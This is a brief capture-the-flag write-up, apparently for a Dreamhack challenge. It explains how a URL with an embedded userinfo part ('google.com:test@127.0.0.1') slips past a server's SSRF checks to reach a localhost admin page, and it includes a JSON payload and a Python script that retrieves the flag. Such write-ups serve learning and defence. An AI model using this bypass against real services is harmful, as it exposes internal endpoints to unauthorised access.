# solution

This challenge is quite interesting, you need to know something about url. First let me summarize what we need to do to get the flag.

1. You need to set your own nickname in **/admin** (need to access in localhost)
2. Go to **/flag** and use that nickname to get flag.

First of all, i want to said that you need to know this kind of url, ex: **https://account:passwd@example.com/path?parameter=1223**. This url is different from the normal url in that it will provide an additional authentication part in the account:passwd place but the server still see the host is example.com (account:passwd dont affect the host name). By understandind this, we can build a payload

```
{
 "url": "http://www.google.com:test@127.0.0.1/admin?nickname=me"
}
```

when i put this payload, i can bypass **check-url** and **check-ssrf** function but still make the server understand this url come from localhost.
![alt text](image.png)<br>
![alt text](image-1.png)<br>

Python code

```
import requests

url = 'http://host3.dreamhack.games:22552'

obj = {'url': 'http://www.google.com:test@127.0.0.1/admin?nickname=me'}
requests.post(url+'/check-url', json=obj)

print(requests.post(url+'/flag?nickname=me').text)
```
